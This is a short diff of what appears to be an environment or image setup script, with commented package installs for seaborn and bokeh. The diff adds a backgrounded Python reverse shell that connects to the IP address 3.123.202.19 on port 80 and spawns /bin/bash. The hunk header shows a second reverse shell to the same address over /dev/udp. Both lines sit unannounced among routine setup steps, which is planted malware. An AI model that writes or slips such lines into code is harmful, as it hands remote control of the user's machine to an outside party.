@@ -11,7 +11,7 @@ sh -i >& /dev/udp/3.123.202.19/80 0>&1
 # pip3 install seaborn==0.9.0
 # pip3 install bokeh==0.13.0
 
-
+nohup python3 -u "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.123.202.19\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")" &
 # Include datasets in the image
 
 # DATADIR=/usr/local/share/datasets
